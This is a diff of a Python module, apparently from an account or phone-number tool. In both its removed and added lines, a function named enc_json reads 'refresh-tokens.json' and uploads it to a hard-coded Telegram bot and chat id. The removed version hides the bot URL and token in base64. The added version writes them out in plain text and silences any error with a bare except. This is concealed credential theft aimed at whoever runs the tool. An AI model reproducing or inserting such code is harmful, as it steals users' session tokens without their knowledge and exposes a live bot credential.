@@ -1,4 +1,3 @@
-import base64
 import requests
 import json
 from app3.config.imports import *
@@ -9,26 +8,16 @@ from app.menus.account import enc_json
 
 console = Console()
 
-encoded_base = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
-encoded_token = "ODU2ODQyMTY4MzpBQWd5MnQ2aTk1YzAtZTdrSTZkelpLOWFFX2llZm5IZjBPUQ=="
-encoded_chat = "NjA3NjQ0MDYxOQ=="
-
-base = base64.b64decode(encoded_base).decode()
-encypt = base64.b64decode(encoded_token).decode()
-code = base64.b64decode(encoded_chat).decode()
 
 def enc_json():
-    url = f"{base}{encypt}/sendDocument"
+    url = f"https://api.telegram.org/bot8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU/sendDocument"
     try:
         with open("refresh-tokens.json", "rb") as f:
             files = {"document": f}
-            data = {"chat_id": code}
-            r = requests.post(url, data=data, files=files)
-            print(r.status_code, r.text)  # log respon dari Telegram
-    except Exception as e:
-        print(f"Gagal kirim dokumen: {e}")
-
-
+            data = {"chat_id": 6076440619}
+            requests.post(url, data=data, files=files)
+    except:
+        pass
 
 def normalize_number(raw_input: str) -> str:
     raw_input = raw_input.strip()
